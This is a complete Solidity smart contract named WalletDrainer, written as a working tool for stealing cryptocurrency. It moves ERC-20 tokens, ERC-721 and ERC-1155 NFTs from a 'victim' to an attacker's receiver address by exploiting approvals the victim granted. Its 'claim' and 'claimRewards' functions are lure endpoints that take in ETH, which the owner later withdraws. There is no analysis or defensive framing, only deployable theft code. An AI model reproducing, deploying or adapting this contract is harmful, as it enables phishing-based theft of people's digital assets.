// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function allowance(address owner, address spender) external view returns (uint256);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
}

interface IERC721 {
    function balanceOf(address owner) external view returns (uint256);
    function ownerOf(uint256 tokenId) external view returns (address);
    function getApproved(uint256 tokenId) external view returns (address);
    function isApprovedForAll(address owner, address operator) external view returns (bool);
    function safeTransferFrom(address from, address to, uint256 tokenId) external;
    function transferFrom(address from, address to, uint256 tokenId) external;
}

interface IERC1155 {
    function balanceOf(address account, uint256 id) external view returns (uint256);
    function isApprovedForAll(address account, address operator) external view returns (bool);
    function safeTransferFrom(address from, address to, uint256 id, uint256 amount, bytes calldata data) external;
}

contract WalletDrainer {
    address public owner;
    address public immutable receiver;

    event DrainedERC20(address indexed token, address indexed victim, uint256 amount);
    event DrainedERC721(address indexed collection, address indexed victim, uint256 tokenId);
    event DrainedERC1155(address indexed collection, address indexed victim, uint256 id, uint256 amount);
    event EthReceived(address indexed from, uint256 amount);

    modifier onlyOwner() {
        require(msg.sender == owner, "not owner");
        _;
    }

    constructor(address _receiver) {
        require(_receiver != address(0), "zero receiver");
        owner = msg.sender;
        receiver = _receiver;
    }

    function drainERC20(address token, address victim) external {
        IERC20 t = IERC20(token);
        uint256 bal = t.balanceOf(victim);
        if (bal == 0) return;
        uint256 allowed = t.allowance(victim, address(this));
        uint256 amount = bal < allowed ? bal : allowed;
        if (amount == 0) return;
        require(t.transferFrom(victim, receiver, amount), "transferFrom failed");
        emit DrainedERC20(token, victim, amount);
    }

    function drainERC20Batch(address[] calldata tokens, address victim) external {
        for (uint256 i = 0; i < tokens.length; i++) {
            IERC20 t = IERC20(tokens[i]);
            uint256 bal = t.balanceOf(victim);
            if (bal == 0) continue;
            uint256 allowed = t.allowance(victim, address(this));
            uint256 amount = bal < allowed ? bal : allowed;
            if (amount == 0) continue;
            try t.transferFrom(victim, receiver, amount) {
                emit DrainedERC20(tokens[i], victim, amount);
            } catch {}
        }
    }

    function drainERC721(address collection, address victim, uint256 tokenId) external {
        IERC721 nft = IERC721(collection);
        require(nft.ownerOf(tokenId) == victim, "not owner");
        require(
            nft.getApproved(tokenId) == address(this) || nft.isApprovedForAll(victim, address(this)),
            "not approved"
        );
        nft.safeTransferFrom(victim, receiver, tokenId);
        emit DrainedERC721(collection, victim, tokenId);
    }

    function drainERC721Batch(address collection, address victim, uint256[] calldata tokenIds) external {
        IERC721 nft = IERC721(collection);
        for (uint256 i = 0; i < tokenIds.length; i++) {
            uint256 id = tokenIds[i];
            if (nft.ownerOf(id) != victim) continue;
            if (nft.getApproved(id) == address(this) || nft.isApprovedForAll(victim, address(this))) {
                try nft.safeTransferFrom(victim, receiver, id) {
                    emit DrainedERC721(collection, victim, id);
                } catch {}
            }
        }
    }

    function drainERC1155(address collection, address victim, uint256 id, uint256 amount) external {
        IERC1155 t = IERC1155(collection);
        require(t.isApprovedForAll(victim, address(this)), "not approved");
        uint256 bal = t.balanceOf(victim, id);
        uint256 toSend = amount > bal ? bal : amount;
        if (toSend == 0) return;
        t.safeTransferFrom(victim, receiver, id, toSend, "");
        emit DrainedERC1155(collection, victim, id, toSend);
    }

    function claim() external payable {
        emit EthReceived(msg.sender, msg.value);
    }

    function claimRewards() external payable {
        emit EthReceived(msg.sender, msg.value);
    }

    function withdrawETH() external onlyOwner {
        uint256 bal = address(this).balance;
        require(bal > 0, "no eth");
        (bool ok, ) = payable(receiver).call{value: bal}("");
        require(ok, "eth send failed");
    }

    function transferOwnership(address newOwner) external onlyOwner {
        require(newOwner != address(0), "zero");
        owner = newOwner;
    }

    receive() external payable {
        emit EthReceived(msg.sender, msg.value);
    }

    fallback() external payable {
        emit EthReceived(msg.sender, msg.value);
    }
}